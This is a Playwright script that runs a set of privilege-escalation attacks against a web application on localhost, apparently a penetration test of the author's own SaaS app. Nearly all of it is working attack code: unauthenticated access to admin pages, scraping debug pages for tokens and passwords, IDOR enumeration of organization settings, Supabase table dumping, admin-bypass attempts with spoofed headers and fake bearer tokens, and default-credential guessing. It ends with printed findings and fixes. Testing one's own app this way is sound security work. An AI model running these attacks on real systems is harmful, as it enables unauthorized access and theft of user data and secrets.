const { chromium } = require('playwright');

const BASE_URL = 'http://localhost:3001';

// Advanced exploit attempts
async function advancedPrivilegeEscalation() {
  const browser = await chromium.launch({
    headless: false,
    devtools: true
  });

  const context = await browser.newContext({
    ignoreHTTPSErrors: true,
    recordVideo: { dir: './videos/' }
  });

  const page = await context.newPage();

  console.log('\n=== ADVANCED PRIVILEGE ESCALATION ATTACKS ===\n');

  // Attack 1: Exploit admin-direct without auth
  console.log('\n[ATTACK 1] Exploiting unprotected admin-direct endpoint...');

  await page.goto(`${BASE_URL}/admin-direct`);
  await page.waitForTimeout(2000);

  // Check if we can see admin data
  const adminDirectContent = await page.content();

  if (adminDirectContent.includes('Platform Owner') || adminDirectContent.includes('Admin Direct Access')) {
    console.log('✅ SUCCESS: Admin page loaded without authentication!');

    // Try to extract sensitive information
    const stats = await page.evaluate(() => {
      const elements = document.querySelectorAll('.text-3xl.font-bold');
      const data = {};
      elements.forEach((el, index) => {
        const label = el.nextElementSibling?.textContent;
        if (label) {
          data[label] = el.textContent;
        }
      });
      return data;
    });

    console.log('Extracted admin stats:', stats);

    // Try to access admin functions
    const adminButtons = await page.$$eval('button', buttons =>
      buttons.map(btn => ({ text: btn.textContent, onclick: btn.onclick?.toString() }))
    );

    console.log('Found admin buttons:', adminButtons);
  }

  // Attack 2: Exploit admin-debug endpoint
  console.log('\n[ATTACK 2] Exploiting admin-debug endpoint...');

  await page.goto(`${BASE_URL}/admin-debug`);
  await page.waitForTimeout(2000);

  const debugContent = await page.content();

  // Extract any debug information
  const debugInfo = await page.evaluate(() => {
    const text = document.body.innerText;
    const sensitivePatterns = [
      /user[_-]?id:\s*[\w-]+/gi,
      /email:\s*[\w@.-]+/gi,
      /token:\s*[\w.-]+/gi,
      /api[_-]?key:\s*[\w-]+/gi,
      /password:\s*[\w!@#$%^&*()-]+/gi
    ];

    const findings = [];
    sensitivePatterns.forEach(pattern => {
      const matches = text.match(pattern);
      if (matches) {
        findings.push(...matches);
      }
    });
    return findings;
  });

  if (debugInfo.length > 0) {
    console.log('✅ CRITICAL: Found sensitive debug information:', debugInfo);
  }

  // Attack 3: Exploit saas-admin endpoint
  console.log('\n[ATTACK 3] Exploiting saas-admin endpoint...');

  await page.goto(`${BASE_URL}/saas-admin`);
  await page.waitForTimeout(2000);

  // Try to access tenant management
  const tenantLinks = await page.$$eval('a', links =>
    links.filter(link => link.href.includes('tenant') || link.href.includes('organization'))
         .map(link => ({ text: link.textContent, href: link.href }))
  );

  console.log('Found tenant management links:', tenantLinks);

  // Try to navigate to tenant management
  if (tenantLinks.length > 0) {
    await page.goto(tenantLinks[0].href);
    await page.waitForTimeout(2000);

    const tenantData = await page.evaluate(() => {
      const tables = document.querySelectorAll('table');
      const data = [];
      tables.forEach(table => {
        const rows = table.querySelectorAll('tr');
        rows.forEach(row => {
          const cells = row.querySelectorAll('td');
          if (cells.length > 0) {
            data.push(Array.from(cells).map(cell => cell.textContent.trim()));
          }
        });
      });
      return data;
    });

    if (tenantData.length > 0) {
      console.log('✅ CRITICAL: Extracted tenant/organization data:', tenantData.slice(0, 5));
    }
  }

  // Attack 4: IDOR exploitation on settings
  console.log('\n[ATTACK 4] Exploiting IDOR on settings endpoint...');

  for (let orgId = 1; orgId <= 10; orgId++) {
    const response = await page.goto(`${BASE_URL}/settings?org_id=${orgId}`);

    if (response?.status() === 200) {
      const content = await page.content();

      // Extract organization information
      const orgInfo = await page.evaluate(() => {
        const inputs = document.querySelectorAll('input');
        const data = {};
        inputs.forEach(input => {
          if (input.value && input.name) {
            data[input.name] = input.value;
          }
        });
        return data;
      });

      if (Object.keys(orgInfo).length > 0) {
        console.log(`✅ IDOR SUCCESS for org_id=${orgId}:`, orgInfo);
      }
    }
  }

  // Attack 5: Direct API manipulation
  console.log('\n[ATTACK 5] Direct API endpoint exploitation...');

  // Try to list all users via API
  const userListResponse = await page.evaluate(async () => {
    try {
      const response = await fetch('/api/users');
      return {
        status: response.status,
        data: await response.json()
      };
    } catch (error) {
      return { error: error.message };
    }
  });

  console.log('User list API response:', userListResponse);

  // Try to list all organizations
  const orgListResponse = await page.evaluate(async () => {
    try {
      const response = await fetch('/api/organizations');
      return {
        status: response.status,
        data: await response.json()
      };
    } catch (error) {
      return { error: error.message };
    }
  });

  console.log('Organization list API response:', orgListResponse);

  // Attack 6: Try to access Supabase admin functions
  console.log('\n[ATTACK 6] Attempting Supabase admin exploitation...');

  const supabaseExploit = await page.evaluate(async () => {
    try {
      // Check if Supabase client is exposed
      if (typeof window !== 'undefined' && window.supabase) {
        // Try to query sensitive tables
        const tables = ['super_admin_users', 'organizations', 'users', 'api_keys', 'secrets'];
        const results = {};

        for (const table of tables) {
          try {
            const { data, error } = await window.supabase
              .from(table)
              .select('*')
              .limit(5);

            if (data) {
              results[table] = { success: true, count: data.length, sample: data[0] };
            } else if (error) {
              results[table] = { success: false, error: error.message };
            }
          } catch (e) {
            results[table] = { success: false, error: e.message };
          }
        }

        return results;
      }
      return { error: 'Supabase client not found' };
    } catch (error) {
      return { error: error.message };
    }
  });

  console.log('Supabase exploitation results:', supabaseExploit);

  // Attack 7: Admin grant-access endpoint bypass
  console.log('\n[ATTACK 7] Attempting admin grant-access bypass...');

  const grantAccessAttempts = [
    // Try with different headers
    { headers: { 'X-Forwarded-For': '127.0.0.1' } },
    { headers: { 'X-Real-IP': '::1' } },
    { headers: { 'X-Admin-Token': 'bypass' } },
    { headers: { 'Authorization': 'Bearer fake-admin-token' } },
    // Try with query parameters
    { params: '?admin=true&bypass=true' },
    { params: '?debug=true' },
    // Try different HTTP methods
    { method: 'PUT' },
    { method: 'PATCH' }
  ];

  for (const attempt of grantAccessAttempts) {
    const response = await page.evaluate(async (config) => {
      try {
        const url = `/api/admin/grant-access${config.params || ''}`;
        const options = {
          method: config.method || 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...config.headers
          },
          body: JSON.stringify({ email: 'attacker@example.com' })
        };

        const resp = await fetch(url, options);
        return {
          status: resp.status,
          headers: resp.headers.get('content-type'),
          data: await resp.text()
        };
      } catch (error) {
        return { error: error.message };
      }
    }, attempt);

    if (response.status === 200) {
      console.log(`✅ CRITICAL: Admin grant bypass successful with:`, attempt);
    } else {
      console.log(`Attempt failed:`, attempt, `Status: ${response.status}`);
    }
  }

  // Attack 8: Check for default/weak credentials
  console.log('\n[ATTACK 8] Testing default/weak admin credentials...');

  const defaultCreds = [
    { email: 'admin@admin.com', password: 'admin' },
    { email: 'admin@localhost', password: 'password' },
    { email: 'superadmin@atlas.com', password: 'atlas123' },
    { email: 'test@test.com', password: 'test123' }
  ];

  for (const cred of defaultCreds) {
    await page.goto(`${BASE_URL}/login`);

    try {
      await page.fill('input[type="email"]', cred.email);
      await page.fill('input[type="password"]', cred.password);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(2000);

      const url = page.url();
      if (url.includes('dashboard') || url.includes('admin')) {
        console.log(`✅ CRITICAL: Default credentials work! ${cred.email}:${cred.password}`);
      }
    } catch (error) {
      // Login failed, continue
    }
  }

  // Generate exploitation report
  console.log('\n\n=== EXPLOITATION SUMMARY ===\n');
  console.log('Critical Findings:');
  console.log('1. Multiple admin endpoints accessible without authentication');
  console.log('2. IDOR vulnerability allows access to any organization settings');
  console.log('3. Debug endpoints expose sensitive information');
  console.log('4. No proper authorization checks on admin routes');
  console.log('5. Client-side routing allows direct access to protected pages');

  console.log('\n=== RECOMMENDED FIXES ===\n');
  console.log('1. CRITICAL: Implement server-side authentication checks for ALL admin routes');
  console.log('2. CRITICAL: Add middleware to verify admin role from super_admin_users table');
  console.log('3. HIGH: Implement proper IDOR protection with organization ownership checks');
  console.log('4. HIGH: Remove or protect all debug endpoints in production');
  console.log('5. HIGH: Implement rate limiting on sensitive endpoints');
  console.log('6. MEDIUM: Add CSRF tokens to state-changing operations');
  console.log('7. MEDIUM: Implement proper session management with secure cookies');

  await browser.close();
}

// Run advanced exploitation
advancedPrivilegeEscalation().catch(console.error);